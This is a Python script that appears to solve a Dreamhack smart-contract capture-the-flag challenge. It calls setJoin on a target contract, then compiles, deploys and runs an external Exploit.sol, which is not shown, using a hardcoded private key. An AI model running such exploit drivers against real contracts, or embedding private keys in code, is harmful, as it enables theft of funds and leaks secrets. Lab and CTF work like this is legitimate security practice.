#!/usr/bin/env python3
from web3 import Web3
import json
import os
import subprocess
import sys
import solcx
# Check if solcx is installed, if not install it


# Install specific Solidity compiler version
# print("Installing Solidity compiler version 0.8.13...")
# try:
#     solcx.install_solc('0.8.13')
# except Exception as e:
#     print(f"Note: {e}")
#     print("Continuing with already installed version if available...")

# Connect to the RPC
rpc_url = "http://host3.dreamhack.games:9610/7657d47cf8ac/rpc"
w3 = Web3(Web3.HTTPProvider(rpc_url))
assert w3.is_connected(), "Failed to connect to RPC server"

# Contract addresses and user info
contract_address = "0x52E4837b99E9B88f821A75B7da1DDe12411E531b"
user_private_key = "0xdd525c37759f38fdbbd569789cdf941b55684024105c5bf5fe2a5eb0ce321b56"
user_address = "0xC748380A62c1292845048D78BbaB7502dAA039f0"

# First step: Call setJoin directly
def set_join():
    print("Setting join status to true for user address...")
    
    # ABI for the setJoin function
    abi = [{"inputs":[{"internalType":"bool","name":"opinion","type":"bool"}],"name":"setJoin","outputs":[],"stateMutability":"nonpayable","type":"function"}]
    contract = w3.eth.contract(address=contract_address, abi=abi)
    
    nonce = w3.eth.get_transaction_count(user_address)
    tx = contract.functions.setJoin(True).build_transaction({
        'from': user_address,
        'nonce': nonce,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"setJoin transaction successful: {tx_hash.hex()}")
    return tx_receipt

# Compile the exploit contract
def compile_contract():
    with open('Exploit.sol', 'r') as file:
        source = file.read()
    
    compiled_sol = solcx.compile_standard({
        "language": "Solidity",
        "sources": {
            "Exploit.sol": {
                "content": source
            }
        },
        "settings": {
            "outputSelection": {
                "*": {
                    "*": ["abi", "metadata", "evm.bytecode", "evm.sourceMap"]
                }
            }
        }
    }, solc_version="0.8.13")
    
    contract_data = compiled_sol['contracts']['Exploit.sol']['Exploit']
    print(contract_data)
    abi = contract_data['abi']
    bytecode = contract_data['evm']['bytecode']['object']
    return abi, bytecode

# Deploy the exploit contract
def deploy_exploit(abi, bytecode):
    exploit_contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(user_address)
    
    # Construct and sign the transaction
    tx = exploit_contract.constructor(contract_address).build_transaction({
        'from': user_address,
        'nonce': nonce,
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    
    # Wait for the transaction receipt
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt.contractAddress

# Execute the exploit
def run_exploit(exploit_address, abi):
    exploit = w3.eth.contract(address=exploit_address, abi=abi)
    nonce = w3.eth.get_transaction_count(user_address)
    
    # Construct and sign the transaction
    tx = exploit.functions.exploit().build_transaction({
        'from': user_address,
        'nonce': nonce,
        'gas': 3000000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    
    # Wait for the transaction receipt
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_hash.hex()

# Verify the solution
def verify_solution():
    abi = [{"type": "function", "name": "solved", "inputs": [], "outputs": [{"name": "", "type": "bool"}], "stateMutability": "view"}]
    contract = w3.eth.contract(address=contract_address, abi=abi)
    is_solved = contract.functions.solved().call()
    return is_solved

def main():
    # First set join status for the user
    set_join()
    
    print("Compiling the exploit contract...")
    abi, bytecode = compile_contract()
    
    print("Deploying the exploit contract...")
    exploit_address = deploy_exploit(abi, bytecode)
    print(f"Exploit deployed at: {exploit_address}")
    
    print("Executing the exploit...")
    tx_hash = run_exploit(exploit_address, abi)
    print(f"Exploit transaction: {tx_hash}")
    
    print("Verifying the solution...")
    if verify_solution():
        print("Challenge solved successfully! ðŸŽ‰")
    else:
        print("Challenge not solved yet. ðŸ˜ž")

if __name__ == "__main__":
    main()
